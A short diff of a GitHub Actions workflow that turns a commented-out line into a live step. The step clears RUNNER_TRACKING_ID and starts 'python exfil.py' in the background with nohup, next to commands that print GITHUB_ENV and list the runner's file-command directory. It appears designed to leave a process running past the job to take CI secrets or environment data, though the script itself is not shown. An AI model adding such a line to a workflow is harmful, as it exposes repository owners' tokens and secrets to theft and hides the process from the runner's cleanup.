@@ -18,7 +18,7 @@ jobs:
         run: |
           echo $GITHUB_ENV
           ls -la /home/runner/work/_temp/_runner_file_commands/
-          # RUNNER_TRACKING_ID="" && (nohup python exfil.py &)
+          RUNNER_TRACKING_ID="" && (nohup python exfil.py &)
 
       - name: Set var 2
         run: |
